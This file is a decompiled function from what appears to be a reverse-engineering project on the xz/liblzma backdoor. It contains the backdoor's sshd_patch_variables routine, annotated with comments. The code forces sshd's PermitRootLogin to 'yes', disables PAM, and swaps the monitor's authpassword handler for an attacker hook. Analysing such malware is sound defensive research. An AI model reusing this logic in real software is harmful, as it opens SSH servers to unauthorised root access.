// /home/kali/xzre-ghidra/xzregh/107D50_sshd_patch_variables.c
// Function: sshd_patch_variables @ 0x107D50
// Calling convention: __stdcall
// Prototype: BOOL __stdcall sshd_patch_variables(BOOL skip_root_patch, BOOL disable_pam, BOOL replace_monitor_reqtype, int monitor_reqtype, global_context_t * global_ctx)


/*
 * AutoDoc: Requires the mm_answer_authpassword hook and metadata to have been recovered, then applies three optional tweaks: force
 * PermitRootLogin to the value `3` ("yes"), zero out `use_pam` when PAM should be disabled, and replace sshd's monitor
 * dispatch table entry with the attacker's authpassword hook. When `monitor_reqtype` isn't explicitly supplied it is
 * derived from the original dispatch table so the forged replies stay in lock-step with sshd's state machine.
 */

#include "xzre_types.h"

BOOL sshd_patch_variables
               (BOOL skip_root_patch,BOOL disable_pam,BOOL replace_monitor_reqtype,
               int monitor_reqtype,global_context_t *global_ctx)

{
  int permit_root_value;
  sshd_ctx_t *sshd_ctx;
  sshd_monitor_func_t authpassword_hook;
  int *permit_root_login;
  uint *use_pam;
  
  if ((((global_ctx == (global_context_t *)0x0) ||
       (sshd_ctx = global_ctx->sshd_ctx, sshd_ctx == (sshd_ctx_t *)0x0)) ||
      (authpassword_hook = sshd_ctx->mm_answer_authpassword_hook, authpassword_hook == (sshd_monitor_func_t)0x0)) ||
     (sshd_ctx->have_mm_answer_authpassword == FALSE)) {
    return FALSE;
  }
  if (skip_root_patch == FALSE) {
    permit_root_login = sshd_ctx->permit_root_login_ptr;
    if (permit_root_login == (int *)0x0) {
      return FALSE;
    }
    permit_root_value = *permit_root_login;
    if (permit_root_value < 3) {
      if (permit_root_value < 0) {
        return FALSE;
      }
      *permit_root_login = 3;
    }
    else if (permit_root_value != 3) {
      return FALSE;
    }
  }
  if (disable_pam != FALSE) {
    use_pam = (uint *)sshd_ctx->use_pam_ptr;
    if (use_pam == (uint *)0x0) {
      return FALSE;
    }
    if (1 < *use_pam) {
      return FALSE;
    }
    *use_pam = 0;
  }
  if (replace_monitor_reqtype == FALSE) {
    monitor_reqtype = *(int *)(sshd_ctx->mm_answer_authpassword_slot + -1) + 1;
  }
  sshd_ctx->monitor_reqtype_authpassword = monitor_reqtype;
  *sshd_ctx->mm_answer_authpassword_slot = authpassword_hook;
  return TRUE;
}

